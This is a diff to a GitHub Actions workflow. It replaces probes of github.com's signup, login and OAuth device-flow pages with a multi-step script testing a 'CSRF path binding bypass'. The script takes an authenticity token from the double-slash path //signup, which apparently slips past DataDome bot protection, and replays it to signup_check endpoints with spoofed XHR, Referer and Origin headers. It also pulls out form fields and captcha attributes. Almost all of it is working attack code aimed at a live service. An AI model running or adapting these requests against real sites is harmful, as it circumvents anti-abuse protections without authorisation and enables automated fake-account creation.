@@ -1,84 +1,90 @@
-name: Test Signup Flow
+name: Test CSRF Path Binding
 on:
   workflow_dispatch:
 
 jobs:
-  test-signup:
+  test-csrf:
     runs-on: ubuntu-latest
     steps:
-      - name: Check runner IP
+      - name: Test CSRF path binding bypass
         run: |
-          echo "Runner IP:"
-          curl -s https://api.ipify.org
+          set +e
+          echo "=== Step 1: Get CSRF from //signup ==="
+          RESPONSE=$(curl -s -c /tmp/cookies.txt https://github.com//signup)
+          CSRF=$(echo "$RESPONSE" | grep -oP 'name="authenticity_token" value="\K[^"]+' | head -1)
+          echo "CSRF token from //signup: ${CSRF:0:30}..."
+          echo "Cookies:"
+          cat /tmp/cookies.txt
           echo
-
-      - name: Test signup page
-        run: |
-          echo "=== GET /signup ==="
-          curl -s -o /tmp/signup.html -w "HTTP Status: %{http_code}\n" -D /tmp/signup_headers.txt https://github.com/signup
-          echo "Response headers:"
-          cat /tmp/signup_headers.txt | head -20
-          echo "---"
-          echo "Content length: $(wc -c < /tmp/signup.html)"
-          echo "DataDome count: $(grep -ci datadome /tmp/signup.html 2>/dev/null || echo 0)"
-          echo "Captcha count: $(grep -ci captcha /tmp/signup.html 2>/dev/null || echo 0)"
-          echo "Octocaptcha count: $(grep -ci octocaptcha /tmp/signup.html 2>/dev/null || echo 0)"
-          echo "Arkose count: $(grep -ci arkose /tmp/signup.html 2>/dev/null || echo 0)"
-          echo "FunCaptcha count: $(grep -ci funcaptcha /tmp/signup.html 2>/dev/null || echo 0)"
-          CSRF=$(grep -oP 'name="authenticity_token" value="\K[^"]+' /tmp/signup.html | head -1)
-          echo "CSRF token: ${CSRF:0:20}..."
-          echo
-
-      - name: Test double-slash signup
-        run: |
-          echo "=== GET //signup ==="
-          curl -s -o /tmp/signup2.html -w "HTTP Status: %{http_code}\n" https://github.com//signup
-          echo "Content length: $(wc -c < /tmp/signup2.html)"
-          echo "DataDome count: $(grep -ci datadome /tmp/signup2.html 2>/dev/null || echo 0)"
-          echo "Captcha count: $(grep -ci captcha /tmp/signup2.html 2>/dev/null || echo 0)"
-
-      - name: Test signup email check
-        run: |
-          echo "=== Testing signup_check/email ==="
-          # Get fresh CSRF token from /signup
-          curl -s -c /tmp/cookies.txt -o /tmp/s.html https://github.com/signup
-          CSRF=$(grep -oP 'name="authenticity_token" value="\K[^"]+' /tmp/s.html | head -1)
-          echo "Got CSRF token: ${CSRF:0:20}..."
           
-          # Test signup_check/email
-          echo "--- POST /signup_check/email ---"
+          echo "=== Step 2: POST //signup_check/email (double-slash) ==="
           curl -s -b /tmp/cookies.txt -X POST \
             -H "Content-Type: application/x-www-form-urlencoded" \
             -H "Accept: application/json" \
-            -d "authenticity_token=$CSRF&value=testsignupflow99@example.com" \
-            "https://github.com/signup_check/email" -w "\nHTTP Status: %{http_code}\n"
+            -d "authenticity_token=$CSRF&value=testsignupcheck99@gmail.com" \
+            "https://github.com//signup_check/email" \
+            -o /tmp/check_ds.txt -w "HTTP Status: %{http_code}\n" -D /tmp/check_ds_headers.txt
+          echo "Response headers:"
+          cat /tmp/check_ds_headers.txt | head -10
+          echo "Response body:"
+          cat /tmp/check_ds.txt | head -c 500
+          echo
+          echo
+          
+          echo "=== Step 3: POST /signup_check/email (single-slash, for comparison) ==="
+          curl -s -b /tmp/cookies.txt -X POST \
+            -H "Content-Type: application/x-www-form-urlencoded" \
+            -H "Accept: application/json" \
+            -d "authenticity_token=$CSRF&value=testsignupcheck99@gmail.com" \
+            "https://github.com/signup_check/email" \
+            -o /tmp/check_ss.txt -w "HTTP Status: %{http_code}\n"
+          echo "Response body:"
+          cat /tmp/check_ss.txt | head -c 500
+          echo
           echo
 
-      - name: Test login flow
-        run: |
-          echo "=== GET /login ==="
-          curl -s -o /tmp/login.html -w "HTTP Status: %{http_code}\n" https://github.com/login
-          echo "Content length: $(wc -c < /tmp/login.html)"
-          echo "Captcha count: $(grep -ci captcha /tmp/login.html 2>/dev/null || echo 0)"
-          echo "Octocaptcha count: $(grep -ci octocaptcha /tmp/login.html 2>/dev/null || echo 0)"
-          echo "Arkose count: $(grep -ci arkose /tmp/login.html 2>/dev/null || echo 0)"
-          # Extract form action
-          echo "Form actions:"
-          grep -oP 'action="\K[^"]*session[^"]*' /tmp/login.html || echo "none"
+          echo "=== Step 4: GET /signup to get CSRF from normal path ==="
+          curl -s -c /tmp/cookies2.txt "https://github.com/signup" -o /tmp/signup_normal.txt -w "HTTP Status: %{http_code}\n"
+          CSRF2=$(grep -oP 'name="authenticity_token" value="\K[^"]+' /tmp/signup_normal.txt | head -1)
+          echo "CSRF token from /signup: ${CSRF2:0:30}..."
+          echo "(This path returns 403/DataDome so no CSRF expected)"
+          echo
 
-      - name: Test GitHub OAuth authorize via logged-in session
-        run: |
-          echo "=== Test GitHub OAuth device flow ==="
-          # Start a device flow
-          RESULT=$(curl -s -X POST \
+          echo "=== Step 5: Test signup_check with XHR-like headers ==="
+          curl -s -b /tmp/cookies.txt -X POST \
+            -H "Content-Type: application/x-www-form-urlencoded" \
             -H "Accept: application/json" \
-            -d "client_id=Iv1.b507a08c87ecfe98&scope=repo,user" \
-            https://github.com/login/device/code)
-          echo "Device flow result: $RESULT"
+            -H "X-Requested-With: XMLHttpRequest" \
+            -H "Referer: https://github.com/signup" \
+            -H "Origin: https://github.com" \
+            -d "authenticity_token=$CSRF&value=testsignupcheck99@gmail.com" \
+            "https://github.com/signup_check/email" \
+            -o /tmp/check_xhr.txt -w "HTTP Status: %{http_code}\n"
+          echo "Response body:"
+          cat /tmp/check_xhr.txt | head -c 500
+          echo
+          echo
+
+          echo "=== Step 6: Test with Referer matching /signup ==="
+          curl -s -b /tmp/cookies.txt -X POST \
+            -H "Content-Type: application/x-www-form-urlencoded" \
+            -H "Accept: application/json" \
+            -H "Referer: https://github.com//signup" \
+            -d "authenticity_token=$CSRF&value=testsignupcheck99@gmail.com" \
+            "https://github.com//signup_check/email" \
+            -o /tmp/check_ref.txt -w "HTTP Status: %{http_code}\n"
+          echo "Response body:"  
+          cat /tmp/check_ref.txt | head -c 500
+          echo
+          echo
           
-          # Can we access /login/device without captcha?
-          echo "--- GET /login/device ---"
-          curl -s -o /tmp/device.html -w "HTTP Status: %{http_code}\n" -L https://github.com/login/device
-          echo "Final URL shows in redirect chain"
-          echo "Content length: $(wc -c < /tmp/device.html)"
-          echo "Captcha in device page: $(grep -ci captcha /tmp/device.html 2>/dev/null || echo 0)"
+          echo "=== Step 7: Test GET /signup page to see if CSRF is embedded ==="
+          echo "Checking //signup page structure for JS-based token extraction"
+          echo "Signup form fields:"
+          echo "$RESPONSE" | grep -oP 'name="[^"]*"' | sort -u | head -20
+          echo
+          echo "Octocaptcha attributes:"
+          echo "$RESPONSE" | grep -o 'data-octocaptcha[^>]*' | head -5
+          echo
+          echo "Form actions:"
+          echo "$RESPONSE" | grep -oP 'action="\K[^"]*' | head -10
